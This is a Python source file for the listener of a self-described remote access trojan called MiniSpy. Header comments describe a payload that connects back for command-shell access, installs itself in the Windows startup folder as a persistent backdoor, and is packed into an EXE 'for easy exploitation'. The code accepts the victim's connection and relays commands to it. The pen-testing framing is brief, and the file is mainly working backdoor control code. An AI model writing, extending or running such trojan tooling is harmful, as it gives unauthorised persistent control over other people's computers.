# MiniSpy Listener

# Introduction:
# An alternate Python payload for Rapid 7's Metasploit Python Payload (https://www.rapid7.com/).
# It is combined with the custom listener for controlling this payload.
# For a simple introduction about what a payload and listener is go to
# https://us.norton.com/internetsecurity-malware-what-is-a-trojan.html
# This is based off of Remote Access Trojan & Backdoor Trojan.
# The purpose of this project is to understand and create effective trojans.
# This will not be a 100% FUD (Fully UnDetectable) by any means.
# This is just supposed to provide an alternative for Pen Testers
# (https://www.cyberdegrees.org/jobs/penetration-tester/). The way this program works is
# the payload will try to bind to the listener. Then backdoor access will provide access to the
# CMD (Command Prompt) or the Terminal based on the operating system. The installer will
# put the payload onto the startup file of windows (Linux not supported) so after reboot
# the program will provide a persistent backdoor. All of the programs (except MiniSpy_Listener.py)
# will be turned into an EXE with Pyinstaller (https://www.pyinstaller.org/) for easy exploitation.

# --------------------------------------------------------------------------------------------------

# Import Libraries
import socket  # For the backdoor connection
import sys  # To exit the program
import getpass  # To get the computers username

# Call important variables
target_ip = 'Enter You IP Here'  # IMPORTANT: You must replace with your IP. Use the computer that will be using the
# listener. Not the IP of the computer the payload will be on.
target_port = 0000  # ALSO IMPORTANT: You also must use a port that is not being used. I like using 4444
# or 4000 but don't use any ports that require admin access.
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # This is a connection object.
# It is using a TCP based connection.

# Also IMPORTANT!!!: Use the same target_ip and target_port as the Payload.
print('---------- MiniSpy Listener ----------\n')

# Try to bind to the address specified above.
try:
    listener.bind((target_ip, target_port))
    print('[+] Binded to %s:%d' % (target_ip, target_port))

except Exception as error:
    print('[-] ' + str(error))
    sys.exit()

# Now try to listen for new connections (A.K.A the payload)
listener.listen(5)  # Only listen for a maximum of 5 connections (This is overkill, we only need one)
print('[+] Listening for new connections... Press ctrl-c to stop')

# Now we listen and store the payload in an object
try:
    payload, address = listener.accept()  # This stores two values the payload object and the address that connected
    print('[+] New connection from ' + str(address))

except KeyboardInterrupt:  # This will only execute after you press ctrl-c (It is called a Keyboard Interrupt)
    print('[-] Quitting')
    sys.exit()

except Exception as error:  # What happens if we get an error that is not Keyboard Interrupt? This happens
    print('[-] ' + str(error))  # Print the error and exit
    sys.exit()

# FINALLY!!! Start the exchange of info with the payload
user_input = input(getpass.getuser() + '@MiniSpy: ')
while user_input != 'exit':
    if user_input.strip() == '':  # If user input is nothing do not send it. It will produce an error.
        pass

    else:
        payload.sendall(user_input.encode('utf-8'))  # Encode and send the command
        from_payload = payload.recv(1024).decode('utf-8')  # Get the response and decode
        print('$ ' + from_payload)  # Print the response

    user_input = input(getpass.getuser() + '@MiniSpy: ')

payload.sendall('exit'.encode('utf-8'))  # Encode and send exit
listener.shutdown(1)  # Shutdown the connection
